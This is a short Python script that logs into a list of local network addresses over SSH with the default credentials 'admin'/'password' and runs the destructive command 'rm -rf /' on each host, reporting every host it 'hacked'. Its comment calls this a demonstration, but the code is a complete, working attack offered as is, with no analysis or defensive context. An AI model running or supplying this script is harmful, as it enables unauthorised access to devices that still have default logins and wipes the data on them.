import socket
import paramiko  # Required for SSH connection

# 10.0.0.138 = WIFI gateway (all ips connect to this diffrent in all routers)
targets = ["10.0.0.138", "192.168.0.2", "192.168.0.3"]

# Exploit payload to be delivered to vulnerable hosts
exploit_payload = "rm -rf /"  # Example payload, extremely destructive, for demonstration purposes only!
# "code to be executed"

# Iterate through the targets
for target in targets:
    try:
        # Create an SSH client instance
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the target system using SSH
        client.connect(target, username="admin", password="password")  # Example credentials, replace with valid ones

        # Execute the exploit payload on the vulnerable system
        stdin, stdout, stderr = client.exec_command(exploit_payload)

        # Print the output of the exploit execution
        print(f"Hack Executed On {target}:")
        print(stdout.read().decode())

        # Close the SSH connection
        client.close()
    except Exception as e:
        print(f"Failed To Hack {target}: {e}")

